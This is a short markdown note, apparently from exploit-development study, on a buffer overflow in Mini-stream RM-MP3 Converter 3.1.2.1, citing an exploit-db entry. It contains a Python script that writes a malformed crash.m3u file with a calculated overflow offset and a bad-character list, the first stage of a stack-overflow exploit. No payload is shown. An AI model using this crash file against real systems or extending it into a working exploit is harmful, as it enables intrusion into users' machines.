# Mini-stream RM-MP3 Converter 3.1.2.1 

Downloaded from: https://www.exploit-db.com/exploits/20116

## Initial Crash
```py
#!/usr/bin/python
 
import sys, struct
 
file="crash.m3u"
 
 
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#
crash = "http://." + "A"*17416 + "B"*4 + "C"*7572
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
```
